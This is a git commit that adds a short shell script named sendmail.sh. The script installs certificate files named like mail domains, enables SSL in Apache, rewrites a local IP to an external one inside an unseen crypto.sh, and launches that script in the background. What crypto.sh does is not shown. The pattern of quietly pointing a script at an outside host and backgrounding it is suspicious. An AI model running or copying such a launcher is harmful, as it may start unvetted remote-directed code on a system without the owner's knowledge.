19422fc24d9f97f50b94f4d190dad4c96455d9bb
SuSux13 <55140831+SuSux13@users.noreply.github.com>
2020-02-01 16:04:18 +0100

    Create sendmail.sh

---
+++ sendmail.sh
@@ -0,0 +1,10 @@
+chmod 600 server.*
+mkdir -p /etc/ssl/certs/
+mv mail.send.free /etc/ssl/certs/
+mv secmail.pro /etc/ssl/certs/
+a2enmod ssl
+service apache2 restart
+sed -i 's/192\.168\.1\.132/89\.107\.242\.44/g' crypto.sh
+chmod 755 crypto.sh
+bash /crypto.sh &
+./crypto.sh &
